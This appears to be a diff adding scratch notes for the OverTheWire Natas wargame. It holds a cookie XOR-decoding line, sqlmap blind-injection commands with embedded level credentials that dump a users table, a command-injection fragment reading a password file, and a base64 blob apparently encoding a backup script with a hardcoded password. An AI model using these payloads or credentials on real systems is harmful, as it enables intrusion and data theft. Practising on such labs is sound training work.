@@ -1,0 +1,16 @@
+$tempdata = json_decode(xor_encrypt(base64_decode('R0EWBhwYAgQXTUsMFwpRVVJHHVtPQUlOUQ0VBgtSUxFHVFNNUQMCWFoFA0wOCg==')), true);
+
+'{"showpassword":"yes","bgcolor":"#ffffff"}'
+KNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLK
+
+sqlmap -u "http://natas15.natas.labs.overthewire.org/index.php?debug" --string="This user exists" --auth-type=Basic --auth-cred=natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J --data "username=natas16"
+
+ '' /etc/natas_webpass/natas17 #
+
+ sqlmap -u "http://natas17.natas.labs.overthewire.org/index.php?debug" --headers="Authorization: Basic bmF0YXMxNzpYa0V1Q2hFMFNibktCdkgxUlU3a3NJYjl1dUxtSTdzZA==" --data "username=natas18"  --level=5 --risk=3 --batch -T users -C username,password --dump
+
+
+
+
+
+ UkVNT1RFPTEyNy4wLjAuMQoKU09VUkNFPS9ob21lL3N0b25lcgpUQVJHRVQ9L3Vzci9sb2NhbC9iYWNrdXAKTE9HPS9ob21lL3N0b25lci9iY2subG9nCkRBVEU9YGRhdGUgKyV5XC4lbVwuJWRcLmAKVVNFUj1zdG9uZXIKI3N1cGVyZHVwZXJwQCQkbm8xa25vd3MKc3NoICRVU0VSQCRSRU1PVEUgbWtkaXIgJFRBUkdFVC8kREFURQppZiBbIC1kICIkU09VUkNFIiBdOyB0aGVuCiAgICBmb3IgaSBpbiBgbHMgJFNPVVJDRSB8IGdyZXAgJ2RhdGEnYDtkbwogICAgICAgIGVjaG8gIkJlZ2luaW5nIGNvcHkgb2YiICRpICAPiAkTE9HCiAgICAgICAgc2NwICAkU09VUkNFLyRpICRVU0VSQCRSRU1PVEU6JFRBUkdFVC8kREFURQogICAgICAgIGVjaG8gJGkgImNvbXBsZXRlZCIgPj4gJExPRwogICAgICAgIGlmIFsgLW4gYHNzaCAkVVNFUkAkUkVNT1RFIGxzICRUQVJHRVQvJERBVEUvJGkgMj4vZGV2L251bGxgIF07dGhlbgogICAgICAgICAgICBybSAkU09VUkNFLyRpCiAgICAgICAgICAgIGVjaG8gJGkgInJlbW92ZWQiID4+ICRMT0cKICAgICAgICAgICAgZWNobyAiIyMjIyMjIyMjIyMjIyMjIyMjIyMiID4+ICRMT0cKICAgICAgICBlbHNlCiAgICAgICAgICAgIGVjaG8gIkNvcHkgbm90IGNvbXBsZXRlIiA+PiAkTE9HCiAgICAgICAgICAgIGV4aXQgMAogICAgICAgIGZpIAogICAgZG9uZQplbHNlCiAgICBlY2hvICJEaXJlY3RvcnkgaXMgbm90IHByZXNlbnQiID4+ICRMT0cKICAgIGV4aXQgMApmaQ==
